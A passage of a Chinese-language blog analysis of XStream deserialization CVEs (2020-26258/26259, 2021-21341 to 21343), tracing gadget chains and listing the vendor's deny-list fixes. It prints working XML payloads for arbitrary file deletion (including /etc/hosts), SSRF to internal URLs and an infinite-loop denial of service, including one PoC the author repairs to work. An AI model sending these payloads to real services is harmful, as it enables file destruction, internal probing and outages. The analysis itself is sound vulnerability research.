&lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>简化后的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">            &lt;is class=&#x27;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#x27;&gt;</span><br><span class="line">              &lt;tempFile&gt;D:/1.txt&lt;/tempFile&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>和上个漏洞不同的地方在于XmlDataSource下的is属性的类实例由SequenceInputStream变为FileStream。</p>
<p>在Base64Data的get方法里，将获取的is对象（FileStream）传入readFrom方法里：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082105440.png" alt="image-20230408210503387"></p>
<p>在readFrom方法里干啥不重要，然后调用is.close();将流（FileStream）关闭：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082106475.png" alt="image-20230408210611412"></p>
<p>在close方法里，将文件删除：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082108712.png" alt="image-20230408210809658"></p>
<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>该漏洞还挺简单的，以下是修复方案：</p>
<p>1.4.14版本的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;jdk.nashorn.internal.objects.NativeString&quot; &#125;); </span><br><span class="line">xstream.denyTypesByRegExp(new String[]&#123; &quot;.*\\.ReadAllStream\\$FileStream&quot; &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.13版本的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;javax.imageio.ImageIO$ContainsFilter&quot;, &quot;jdk.nashorn.internal.objects.NativeString&quot; &#125;); </span><br><span class="line">xstream.denyTypes(new Class[]&#123; java.lang.ProcessBuilder.class &#125;); </span><br><span class="line">xstream.denyTypesByRegExp(new String[]&#123; &quot;.*\\.ReadAllStream\\$FileStream&quot; &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.7~1.4.12版本的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;javax.imageio.ImageIO$ContainsFilter&quot;, &quot;jdk.nashorn.internal.objects.NativeString&quot; &#125;);</span><br><span class="line">xstream.denyTypes(new Class[]&#123; java.lang.ProcessBuilder.class, java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class &#125;);</span><br><span class="line">xstream.denyTypesByRegExp(new String[]&#123; &quot;.*\\$LazyIterator&quot;, &quot;javax\\.crypto\\..*&quot;, &quot;.*\\.ReadAllStream\\$FileStream&quot; &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.6及以下的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xstream.registerConverter(new Converter() &#123;</span><br><span class="line">  public boolean canConvert(Class type) &#123;</span><br><span class="line">    return type != null &amp;&amp; (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class</span><br><span class="line">        || type.getName().equals(&quot;javax.imageio.ImageIO$ContainsFilter&quot;) || type.getName().equals(&quot;jdk.nashorn.internal.objects.NativeString&quot;)</span><br><span class="line">        || type == java.lang.Void.class || void.class || Proxy.isProxy(type)</span><br><span class="line">        || type.getName().startsWith(&quot;javax.crypto.&quot;) || type.getName().endsWith(&quot;$LazyIterator&quot;) || type.getName().endsWith(&quot;.ReadAllStream$FileStream&quot;));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_VERY_HIGH);</span><br></pre></td></tr></table></figure>

<p>官方给的修复方案都是直接加黑名单或者转换器，其实对于用户来说直接升级版本也行。</p>
<h2 id="CVE-2020-26258"><a href="#CVE-2020-26258" class="headerlink" title="CVE-2020-26258"></a>CVE-2020-26258</h2><h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.14</li>
</ul>
<h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成SSRF。</p>
<p>POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;javax.activation.URLDataSource&#x27;&gt;</span><br><span class="line">            &lt;url&gt;http://localhost:8080/internal/:&lt;/url&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>删减后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;javax.activation.URLDataSource&#x27;&gt;</span><br><span class="line">            &lt;url&gt;http://localhost:2333/internal/:&lt;/url&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>这次将dataSource属性的值由XmlDataSource类实例变成URLDataSource类实例。</p>
<p>在Base64Data的get方法中，调用了URLDataSource类实例的getInputStream方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082116232.png" alt="image-20230408211616169"></p>
<p>在getInputStream方法里直接向url地址发起连接：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082116108.png" alt="image-20230408211642043"></p>
<h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p>这里的修复方案与上一个漏洞（CVE-2020-26259）相同。</p>
<h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>XStream &lt;&#x3D; 1.4.15 爆出了11个漏洞，从CVE-2021-21341到CVE-2021-21351。</p>
<h2 id="CVE-2021-21341"><a href="#CVE-2021-21341" class="headerlink" title="CVE-2021-21341"></a>CVE-2021-21341</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>发现很多同人文，也不知道是谁抄的谁，比如：<a href="https://xz.aliyun.com/t/11372#toc-1">XSteam历史漏洞分析 </a>和<a href="https://paper.seebug.org/1543/#2-cve-2021-21344">Xstream 反序列化远程代码执行漏洞深入分析</a>这两篇文章前面的内容一模一样，真是牛~</p>
<p>这个漏洞会造成无限循环耗光资源，也就是DOS攻击。</p>
<p>官网的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">            &lt;buf&gt;&lt;/buf&gt;</span><br><span class="line">            &lt;pos&gt;-2147483648&lt;/pos&gt;</span><br><span class="line">            &lt;mark&gt;0&lt;/mark&gt;</span><br><span class="line">            &lt;count&gt;0&lt;/count&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">          &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">        &lt;transferFlavors/&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">      &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>先来理解四个东西：</p>
<p>第一个是serialization&#x3D;’custom’：</p>
<blockquote>
<p>网上搜不到，问的GPT~</p>
</blockquote>
<p>在XStream库中，当标签带有<code>serialization=&#39;custom&#39;</code>属性时，它表示该标签的序列化将使用自定义序列化方式。这意味着，当XStream库在将Java对象序列化为XML时，它将调用自定义序列化方法（writeObject）来序列化该对象的内容，而不是使用默认的序列化方式。</p>
<p>序列化和反序列化使用SerializableConverter来进行转换Java对象和xml。</p>
<p>在SerializableConverter的doUnmarshal方法中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082229068.png" alt="image-20230408222921005"></p>
<p>会调用callReadObject方法，进入查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082231126.png" alt="image-20230408223119069"></p>
<p>发现他会<strong>调用PriorityQueue的readObject方法</strong>。</p>
<p>也就是说当标签带有serialization&#x3D;’custom’属性时，会调用该xml标签对应的Java对象的readObject方法。举个例子：对于刚刚的POC，在PriorityQueue标签中指定了serialization&#x3D;’custom’属性，同时它有一个PriorityQueue的子标签，表示调用PriorityQueue的readObject方法进行反序列化。</p>
<p>第二个是 default标签： default标签的值是一个XML片段，它描述了Java对象的属性值，它里面存的属性并不完整，这取决于序列化时（writeObject）为哪些属性设置了值，就会在default标签下。</p>
<p>第三个是 <code>&lt;unserializable-parents/&gt;</code>标签：它将指示XStream在反序列化时忽略该对象的所有父类，也就是不反序列化父类。</p>
<p>第四个是reference属性：在XStream库中，当标签中带有<code>reference</code>属性时，它表示当前对象引用了已经反序列化的另一个对象。<code>reference</code>属性的值是一个字符串，它指定了被引用对象的唯一标识符，通常是该对象在反序列化时生成的ID。当XStream库在反序列化时遇到一个带有<code>reference</code>属性的元素时，它会尝试在已经反序列化的对象中查找具有相同ID的对象，并将该元素的值设置为该对象的引用。使用<code>reference</code>属性可以减少XML文件的大小，并且在反序列化时可以避免创建多个相同对象的副本。在处理大型对象图形时，这种优化非常重要。</p>
<p>接着简化一下POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">            &lt;pos&gt;-2147483648&lt;/pos&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>之前说过他会调用自定义的readObject完成反序列化，这有点像yso的某条链，然后调用heapify方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082341732.png" alt="image-20230408234121794"></p>
<p>在heapify方法里调用siftDown方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082342332.png" alt="image-20230408234207283"></p>
<p>comparator我们已经赋值为ObservableList$1类的实例了，所以他会调用siftDownUsingComparator方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082342632.png" alt="image-20230408234247585"></p>
<p>然后ObservableList是个接口，而ObservableList$1代表匿名类，在Java中，就算是匿名类，在运行中也会存储一个类名，按照在代码中的定义顺序，在外部类名后增加$1、$2等依次排序。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082343848.png" alt="image-20230408234349768"></p>
<p>然后来到sorted方法内部的比较器的compare方法，里面调用Base64Data的toString方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082346091.png" alt="image-20230408234643003"></p>
<p>在toString方法里又调用了get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091556277.png" alt="image-20230409155601181"></p>
<p>获取XmlDataSource的is属性，我们已赋值为ByteArrayInputStream类实例，然后调用readFrom方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091556692.png" alt="image-20230409155638630"></p>
<p>在readFrom方法里死循环：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091558957.png" alt="image-20230409155836905"></p>
<p>进入read方法查看，他其实是ByteArrayInputStream的read方法，这里需要提一嘴，this.buf为空，count未赋值，默认未0，所以buf.length也为0，调用read方法传进去的三个参数的值分别为空、0、0：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091602569.png" alt="image-20230409160221883"></p>
<p>在这里，pos赋值为了int类型的最小值，而count为0，在计算机中，对于四个字节的int类型来说，0减去-2147483648，也就是-2147483648按位取反加一，-2147483648转换为二进制为1000 0000 0000 0000 0000 0000 0000 0000，按位取反后为：0111 1111 1111 1111 1111 1111 1111 1111然后加1，即为原来的1000 0000 0000 0000 0000 0000 0000 0000。也就是说0减去最小值得到的仍为最小值，所以上图的avail变量的值为-2147483648，len为0，它大于avail，所以将最小值赋给了len，然后由于len小于0，所以返回0。返回到readFrom方法中，所以sz为0，后续count+sz依旧是0+0为0，下一次循环进入read方法，仍然是0减去最小值，然后赋值给len属性，接着返回0，造成了死循环。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091558957.png" alt="image-20230409155836905"></p>
<p>对于POC的其他疑问：</p>
<p>POC为什么要有<code>&lt;int&gt;3&lt;/int&gt;</code>标签？</p>
<p>因为在readObject中他需要读取一个int值。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082356976.png" alt="image-20230408235609894"></p>
<p>POC为什么有两个Base64Data标签？</p>
<p>因为我们设置size为2，所以需要有两个对象存入队列中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082355244.png" alt="image-20230408235511178"></p>
<p>那size不能设置成1吗，那不就只需要一个Base64Data标签了？</p>
<p>因为在heapify方法里，size必须大于等于2，否则无法调用siftDown方法触发后续利用链。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082358599.png" alt="image-20230408235807545"></p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>PriorityQueue的readObject中将Base64Data类实例存入队列，后续siftDownUsingComparator方法触发ObservableList$1的compare方法，在compare方法里又连接到了Base64Data类实例，触发Base64Data类实例的toString方法，后续为常规利用链了。</p>
<p>关键地方：siftDownUsingComparator方法连接ObservableList$1，compare方法连接Base64Data</p>
<h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>后续的漏洞修复都是升级版本，不再赘述。</p>
<h2 id="CVE-2021-21342"><a href="#CVE-2021-21342" class="headerlink" title="CVE-2021-21342"></a>CVE-2021-21342</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>此漏洞造成SSRF，官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;javax.activation.URLDataSource&#x27;&gt;</span><br><span class="line">                &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>官方给的POC会报空指针异常，未达到sink，所以我修正了一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;satellites /&gt;</span><br><span class="line">            &lt;invocationProperties /&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;javax.activation.URLDataSource&#x27;&gt;</span><br><span class="line">                &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>加了两个必要的属性satellites、invocationProperties就可以SSRF了。</p>
<p>仍然使用PriorityQueue的readObject作入口点，触发comparator的compare方法，在IndexOrderComparator的compare方法中，调用了compareIndices方法，将indexMap作为第一个参数传入，indexMap已经赋值为ResponseContext实例：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091646511.png" alt="image-20230409164608444"></p>
<p>在compareIndices方法中，调用了ResponseContext实例的get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091647452.png" alt="image-20230409164722395"></p>
<p>在get方法中，调用getMessage方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091648546.png" alt="image-20230409164825485"></p>
<p>在getMessage方法，将message属性封装为MessageWrapper类实例：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091649235.png" alt="image-20230409164919165"></p>
<p>其实就是将message的值（XMLMessage$XMLMultiPart类实例）赋给了delegate属性：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091650300.png" alt="image-20230409165014230"></p>
<p>回到上层，将封装好的MessageWrapper类实例返回：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091649235.png" alt="image-20230409164919165"></p>
<p>然后调用getAttachments方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091651704.png" alt="image-20230409165127647"></p>
<p>调用delegate属性（XMLMessage$XMLMultiPart类实例）的getAttachments方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091651777.png" alt="image-20230409165158724"></p>
<p>接着调用getMessage方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091653666.png" alt="image-20230409165326605"></p>
<p>在getMessage方法中，调用dataSource属性（URLDataSource类实例）的getInputStream方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091654202.png" alt="image-20230409165411113"></p>
<p>在URLDataSource类实例的getInputStream方法中，直接进行url的连接，造成SSRF：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091655912.png" alt="image-20230409165502853"></p>
<h2 id="CVE-2021-21343"><a href="#CVE-2021-21343" class="headerlink" title="CVE-2021-21343"></a>CVE-2021-21343</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成任意文件删除，官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource&#x27;&gt;</span><br><span class="line">                &lt;part&gt;</span><br><span class="line">                  &lt;dataHead&gt;</span><br><span class="line">                    &lt;tail/&gt;</span><br><span class="line">                    &lt;head&gt;</span><br><span class="line">                      &lt;data class=&#x27;com.sun.xml.internal.org.jvnet.mimepull.MemoryData&#x27;&gt;</span><br><span class="line">                        &lt;len&gt;3&lt;/len&gt;</span><br><span class="line">                        &lt;data&gt;AQID&lt;/data&gt;</span><br><span class="line">                      &lt;/data&gt;</span><br><span class="line">                    &lt;/head&gt;</span><br><span class="line">                  &lt;/dataHead&gt;</span><br><span class="line">                  &lt;contentTransferEncoding&gt;base64&lt;/contentTransferEncoding&gt;</span><br><span class="line">                  &lt;msg&gt;</span><br><span class="line">                    &lt;it class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">                      &lt;cursor&gt;0&lt;/cursor&gt;</span><br><span class="line">                      &lt;lastRet&gt;1&lt;/lastRet&gt;</span><br><span class="line">                      &lt;expectedModCount&gt;4&lt;/expectedModCount&gt;</span><br><span class="line">                        &lt;outer-class&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                        &lt;/outer-class&gt;</span><br><span class="line">                    &lt;/it&gt;</span><br><span class="line">                    &lt;in class=&#x27;java.io.FileInputStream&#x27;&gt;</span><br><span class="line">                      &lt;fd/&gt;</span><br><span class="line">                      &lt;channel class=&#x27;sun.nio.ch.FileChannelImpl&#x27;&gt;</span><br><span class="line">                        &lt;closeLock/&gt;</span><br><span class="line">                        &lt;open&gt;true&lt;/open&gt;</span><br><span class="line">                        &lt;threads&gt;</span><br><span class="line">                          &lt;used&gt;-1&lt;/used&gt;</span><br><span class="line">                        &lt;/threads&gt;</span><br><span class="line">                        &lt;parent class=&#x27;sun.plugin2.ipc.unix.DomainSocketNamedPipe&#x27;&gt;</span><br><span class="line">                          &lt;sockClient&gt;</span><br><span class="line">                            &lt;fileName&gt;/etc/hosts&lt;/fileName&gt;</span><br><span class="line">                            &lt;unlinkFile&gt;true&lt;/unlinkFile&gt;</span><br><span class="line">                          &lt;/sockClient&gt;</span><br><span class="line">                          &lt;connectionSync/&gt;</span><br><span class="line">                        &lt;/parent&gt;</span><br><span class="line">                      &lt;/channel&gt;</span><br><span class="line">                      &lt;closeLock/&gt;</span><br><span class="line">                    &lt;/in&gt;</span><br><span class="line">                  &lt;/msg&gt;</span><br><span class="line">                &lt;/part&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>这个调用链非常复杂，估计是用了什么自动化工具找的，简化后的POC如下：</p>
